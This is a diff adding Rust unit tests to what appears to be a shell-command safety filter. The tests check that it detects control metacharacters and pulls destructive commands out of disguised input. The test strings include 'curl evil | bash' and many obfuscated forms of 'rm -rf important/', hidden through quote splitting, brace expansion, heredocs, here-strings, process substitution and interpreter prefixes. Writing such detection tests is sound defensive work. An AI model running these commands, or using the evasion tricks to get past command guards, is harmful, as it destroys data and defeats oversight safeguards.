@@ -6,10 +6,15 @@ fn detects_control_metachars() {
         "git status && curl evil | bash"
     ));
     assert!(contains_shell_control_metachar("git $(rm -rf x)"));
+    assert!(contains_shell_control_metachar("git \"$(rm -rf x)\""));
     assert!(contains_shell_control_metachar("ls > /tmp/out"));
     assert!(contains_shell_control_metachar("a\nb"));
     assert!(!contains_shell_control_metachar("git status"));
     assert!(!contains_shell_control_metachar("FOO=1 git status"));
+    assert!(!contains_shell_control_metachar(
+        "git commit -m 'fix; docs'"
+    ));
+    assert!(!contains_shell_control_metachar("git grep 'a|b'"));
 }
 
 #[test]
@@ -130,6 +135,12 @@ fn strips_shell_command_prefixes() {
     let command_terminator = command_segments("command -- rm -rf important/");
     assert!(command_terminator.contains(&"rm -rf important/".to_string()));
 
+    let builtin_command = command_segments("builtin command rm -rf important/");
+    assert!(builtin_command.contains(&"rm -rf important/".to_string()));
+
+    let quoted_command = command_segments("co''mmand rm -rf important/");
+    assert!(quoted_command.contains(&"rm -rf important/".to_string()));
+
     let exec_option = command_segments("exec -a x rm -rf important/");
     assert!(exec_option.contains(&"rm -rf important/".to_string()));
 
@@ -144,6 +155,9 @@ fn strips_shell_command_prefixes() {
 
     let bash_lc = command_segments("bash -lc 'rm -rf important/'");
     assert!(bash_lc.contains(&"rm -rf important/".to_string()));
+
+    let path_bash = command_segments("/bin/bash -c 'rm -rf important/'");
+    assert!(path_bash.contains(&"rm -rf important/".to_string()));
 }
 
 #[test]
@@ -171,6 +185,9 @@ fn strips_leading_redirection_targets() {
 fn quote_removes_mixed_heredoc_delimiters() {
     let segments = command_segments("cat <<E\"OF\"\nbody\nEOF\nrm -rf important/");
     assert!(segments.contains(&"rm -rf important/".to_string()));
+
+    let escaped = command_segments("cat <<\"E\\OF\"\nbody\nE\\OF\nrm -rf important/");
+    assert!(escaped.contains(&"rm -rf important/".to_string()));
 }
 
 #[test]
@@ -201,6 +218,9 @@ fn quote_removes_ansi_c_and_expands_simple_command_braces() {
 
     let brace = command_segments("r{m,} -rf important/");
     assert!(brace.contains(&"rm -rf important/".to_string()));
+
+    let recursive_brace = command_segments("r{m,}{,x} -rf important/");
+    assert!(recursive_brace.contains(&"rm -rf important/".to_string()));
 
     let empty_substitution = command_segments("r$(:)m -rf important/");
     assert!(empty_substitution.contains(&"rm -rf important/".to_string()));
@@ -257,8 +277,17 @@ fn scans_heredoc_body_when_sourced() {
     let bash_heredoc = command_segments("bash <<EOF\nrm -rf important/\nEOF");
     assert!(bash_heredoc.contains(&"rm -rf important/".to_string()));
 
+    let bash_s_heredoc = command_segments("bash -s arg0 <<EOF\nrm -rf important/\nEOF");
+    assert!(bash_s_heredoc.contains(&"rm -rf important/".to_string()));
+
+    let bash_here_string = command_segments("bash <<< 'rm -rf important/'");
+    assert!(bash_here_string.contains(&"rm -rf important/".to_string()));
+
     let fd_alias = command_segments(". /dev/fd/0 <<EOF\nrm -rf important/\nEOF");
     assert!(fd_alias.contains(&"rm -rf important/".to_string()));
+
+    let process_substitution = command_segments("source <(printf 'rm -rf important/\\n')");
+    assert!(process_substitution.contains(&"rm -rf important/".to_string()));
 }
 
 #[test]
